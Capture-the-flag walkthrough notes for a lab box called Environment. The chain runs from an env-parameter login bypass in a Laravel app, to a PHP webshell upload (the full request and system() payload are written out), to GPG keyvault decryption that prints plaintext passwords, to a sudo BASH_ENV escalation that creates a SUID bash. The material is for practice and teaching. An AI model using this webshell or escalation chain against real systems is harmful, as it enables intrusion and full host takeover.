# Environment (10.10.11.67)

```bash
PORT     STATE SERVICE   REASON         VERSION
22/tcp   open  ssh       syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 5c023395ef44e280cd3a960223f19264 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGrihP7aP61ww7KrHUutuC/GKOyHifRmeM070LMF7b6vguneFJ3dokS/UwZxcp+H82U2LL+patf3wEpLZz1oZdQ=
|   256 1f3dc2195528a17759514810c44b74ab (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ7xeTjQWBwI6WERkd6C7qIKOCnXxGGtesEDTnFtL2f2
80/tcp   open  http      syn-ack ttl 63 nginx 1.22.1
|_http-title: Did not follow redirect to http://environment.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.22.1
```
- no containers from TTL
# HTTP 80

- redirected to: environment.htb
- laravel backend (php nginx debian)
- no strange comment
- no subdomain in port 80
- we can send mail to: /mailing
- maybe cve-2024-52301
- we can alter text in /page:
```bash
curl 'http://environment.htb/?--env=test'

# output gets reflected in title
```
- maybe env is setting title or something like that
- --env=development doesnt seems to do anything other than setting HTML to user input
- found:
```hmtl
/login                (Status: 200) [Size: 2391]
/logout               (Status: 302) [Size: 358] [--> http://environment.htb/login]
/mailing              (Status: 405) [Size: 244854]
/robots.txt           (Status: 200) [Size: 24]
/storage              (Status: 301) [Size: 169] [--> http://environment.htb/storage/]
/up                   (Status: 200) [Size: 2126]
/upload               (Status: 405) [Size: 244852]
/vendor               (Status: 301) [Size: 169] [--> http://environment.htb/vendor/]
```
- if we force an error we can see a part of the backend with comments:
```php

        $keep_loggedin = False;
    } elseif ($remember == 'True') {
        $keep_loggedin = True;
    }
 
    if($keep_loggedin !== False) {
    // TODO: Keep user logged in if he selects "Remember Me?"
    }
 
    if(App::environment() == "preprod") { //QOL: login directly as me in dev/local/preprod envs
        $request->session()->regenerate();
        $request->session()->put('user_id', 1);
        return redirect('/management/dashboard');
    }
 
    $user = User::where('email', $email)->first();
```
- we can try intercept a login with random data and add "?--env=preprod" as get param
- logged in as Hish
- we can just change profile pic, just picture (maybe file upload bypass) 
- we can upload a PHP webshell:
```txt
POST /upload HTTP/1.1
Host: environment.htb
Content-Length: 41460
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMqYGhUpNQQXI3xOX
Accept: */*
Origin: http://environment.htb
Referer: http://environment.htb/management/profile
Accept-Encoding: gzip, deflate, br
Cookie: XSRF-TOKEN=eyJpdiI6ImtlUFhnaU56MGY0ZGpOcXpGSzdwaWc9PSIsInZhbHVlIjoiMU9tb3oybG1Bb29YYkptNDRaZ2JuWllwMDlBWWVUbUhoYkZGSXVnRUNEeVNSM3pZQXRVZlVaWjJLc1JxdWxoWDgrU1VvYWdUTFJ1VTV6K2N1WVRjdk5yTWVxSG9JbEJ6aFpsL052clBaWlBXOTRBYWdnc1JvSkUzQmlsUGRmRkoiLCJtYWMiOiJmYzc4NTBkZjA4YmQ4ZDdlZmE5YzIxYjU5MmU4NWU0MTc2OWM2NjNmMWQzMmI0ZmZiMzI4YjA2ZjI1OGEwMzMwIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IklMVXBrb3YrVG9LZGtYNHk2WXA4Q0E9PSIsInZhbHVlIjoib2t4VnROeThJVHg2QzB2Mno0aUh1aS9wMlFHT3VaMXd3K1ZCVElBSjcyaFlIREhRS3c4Q2xncTRVUDRjYVJ3NGtTMC81aTBnQis5TEs1L25KaVRZNStSWDNIUjVvTE9ZcnozM1ArekpJQVAvWWxVd0JTd3BGRk15NGIranE3U0kiLCJtYWMiOiJjY2U4MWQ0NjI1OGQ5MmNjODZlYTI0YTkwMmZjYjgyMzA0ZjJiOTI3NzVmNWIzZTEzMDk2MmRkOGMyMjBmYzBmIiwidGFnIjoiIn0%3D
Connection: keep-alive

------WebKitFormBoundaryMqYGhUpNQQXI3xOX
Content-Disposition: form-data; name="_token"

mY6TDwTbv2ENGZhBTnCu95GBj1r5QjiVJi752YFF
------WebKitFormBoundaryMqYGhUpNQQXI3xOX
Content-Disposition: form-data; name="upload"; filename="shell.php."
Content-Type: image/png

<image data>

<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
```
- we can execute commands by visiting 'http://environment.htb/storage/files/shell.php?cmd=ls' 
- keep the session
- we can put revshell payload.

# www-data

- we can read some config files and found db sqlite
- users table (no luck in cracking):
```sql
$2y$12$QPbeVM.u7VbN9KCeAJ.JA.WfWQVWQg0LopB9ILcC7akZ.q641r1gi
$2y$12$i.h1rug6NfC73tTb8XF0Y.W0GDBjrY5FBfsyX2wOAXfDWOUk9dphm
$2y$12$6kbg21YDMaGrt.iCUkP/s.yLEGAE2S78gWt.6MAODUD3JXFMS13J.
```

- found gpg file and decripted:
```bash
(remote) www-data@environment:/home/hish$ cp -r .gnupg/ /tmp/.gnupg
(remote) www-data@environment:/home/hish$ export GNUPGHOME=/tmp/.gnupg/
(remote) www-data@environment:/home/hish$ gpg --list-secret-keys
gpg: WARNING: unsafe permissions on homedir '/tmp/.gnupg'
/tmp/.gnupg/pubring.kbx
-----------------------
sec   rsa2048 2025-01-11 [SC]
      F45830DFB638E66CD8B752A012F42AE5117FFD8E
uid           [ultimate] hish_ <hish@environment.htb>
ssb   rsa2048 2025-01-11 [E]

(remote) www-data@environment:/home/hish$ 
(remote) www-data@environment:/home/hish$ chmod 700 /tmp/.gnupg/
(remote) www-data@environment:/home/hish$ gpg --list-secret-keys
/tmp/.gnupg/pubring.kbx
-----------------------
sec   rsa2048 2025-01-11 [SC]
      F45830DFB638E66CD8B752A012F42AE5117FFD8E
uid           [ultimate] hish_ <hish@environment.htb>
ssb   rsa2048 2025-01-11 [E]

(remote) www-data@environment:/home/hish$ gpg --decrypt /home/hish/backup/keyvault.gpg 
gpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11
      "hish_ <hish@environment.htb>"
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!!
FACEBOOK.COM -> summerSunnyB3ACH!!
```

- password reuse for environment.htb:marineSPm@ster!!

# hish

- we sudo -l:
```bash
Matching Defaults entries for hish on environment:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+="ENV
    BASH_ENV", use_pty

User hish may run the following commands on environment:
    (ALL) /usr/bin/systeminfo
```

- with BASH_ENV we can execute code by creating /tmp/test.sh
```bash
#!/bin/bash

cp /bin/bash /tmp/bash
chmod +xs /tmp/bash
```

- then we can have RCE:
```bash
sudo BASH_ENV=/tmp/test.sh /usr/bin/systeminfo
```

# root

- we now have bash SUID bash in tmp

